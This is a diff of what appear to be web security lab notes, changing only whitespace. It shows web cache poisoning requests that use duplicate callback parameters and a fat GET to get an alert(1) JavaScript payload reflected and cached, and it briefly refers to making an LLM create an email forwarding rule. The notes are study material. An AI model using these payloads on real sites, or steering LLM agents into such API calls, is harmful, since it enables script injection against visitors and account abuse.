@@ -3919,10 +3919,10 @@ LLM -> API: create_email_forwarding_rule('peter')
   - send repeater > GET /js/geolocate.js?callback=setCountryCookie
     Response: setCountryCookie({"country":"United Kingdom"}
   - Study the cache behavior. Observe that if you add **duplicate callback parameters**, only the final one is reflected in the response, but both are still keyed
-    `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`
+    `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`  
     Response: alert(1)({"country":"United Kingdom"}
 - Web cache poisoning via a fat **GET request**
-  - send repeater > GET /js/geolocate.js?callback=setCountryCookie
+  - send repeater > GET /js/geolocate.js?callback=setCountryCookie  
     Response: setCountryCookie({"country":"United Kingdom"}
   - You can control the name of the function in the response by **passing in a duplicate callback parameter via the request body**, only the final one is reflected in the response
     GET /js/geolocate.js?callback=setCountryCookie
